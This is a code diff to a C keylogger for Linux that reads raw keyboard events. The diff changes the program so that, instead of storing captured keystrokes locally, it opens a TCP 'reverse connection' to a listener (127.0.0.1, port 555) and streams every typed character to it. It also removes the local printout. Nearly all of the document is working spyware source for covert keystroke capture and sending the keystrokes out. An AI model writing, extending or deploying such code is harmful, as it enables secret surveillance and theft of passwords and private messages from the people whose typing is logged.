@@ -5,6 +5,9 @@
 #include <unistd.h>
 #include <string.h>
 #include <ctype.h>
+#include <arpa/inet.h>
+#include <netinet/in.h>
+#include <sys/socket.h>
 
 /*Defines a struct type for keymapping the scancodes efficiently*/
 typedef struct {
@@ -23,7 +26,7 @@ typedef struct {
 /*Set your own SHIFT and CAPSLOCK scancodes below*/
 #define L_SHIFT 42
 #define R_SHIFT 54
-#define CAPSLOCK 55
+#define CAPSLOCK 58
 
 int main(int argc, char * argv[]){
     /*Set your own keyboard's scancode layout below. Here is the pattern for ABNT (brazillian) keyboards except for some particularities of my notebook.*/
@@ -145,9 +148,30 @@ int main(int argc, char * argv[]){
     int shiftPressed = 0;
     char typed[MAX_KEYS][10] = {};
     
+    /* Reverse connection settings */
+    char * str_address = "127.0.0.1";
+    int port = 555;
+    int sock_fd;
 
+    struct sockaddr_in server_info;
+    if ((sock_fd = socket(AF_INET, SOCK_STREAM, 0)) != -1){
+        server_info.sin_family = AF_INET;
+	server_info.sin_port = htons(port);
+	inet_pton(AF_INET, str_address, &server_info.sin_addr);
+	int status = connect(sock_fd, (struct sockaddr *)&server_info, (socklen_t)sizeof(server_info));
+	if (status < 0){
+	    return status;
+	}
+	char * con_msg = "[+]Read:\n";
+	send(sock_fd, con_msg, sizeof(con_msg), 0);
+    }else {
+        return sock_fd;
+    }
+    
+    /* Keyboard reading loop */
+    char buffer[1024];
+    int recv_status;
     while (!exit){
-
         read(rk, &event, sizeof(event));
         if (event.type == EV_KEY){
 		/*Checks if shift was pressed or released*/
@@ -172,9 +196,9 @@ int main(int argc, char * argv[]){
 					int isAlphaCharacter = isalpha(keymap[i].out_shift_ascii[0]);
 					/*Puts the right character for each key while in capslock or shift is pressed*/
 					if (inUpperCase && isAlphaCharacter || !isAlphaCharacter && shiftPressed){
-						strcpy(typed[key_counter], keymap[i].in_shift_ascii);
+						send(sock_fd, keymap[i].in_shift_ascii, 10, 0);
 					}else{
-						strcpy(typed[key_counter], keymap[i].out_shift_ascii);
+						send(sock_fd, keymap[i].out_shift_ascii, 10, 0);
 					}
 					key_counter++;
 					i = KEYMAP_SIZE;
@@ -186,10 +210,7 @@ int main(int argc, char * argv[]){
 
     printf("\n");
     close(rk);
+    close(sock_fd);
 
-    /*Print the characters typed directly in terminal for experimental reasons.*/
-    for (int c = 0; c < key_counter; c++){
-        printf("%s", typed[c]);
-    }
     return 0;
 }
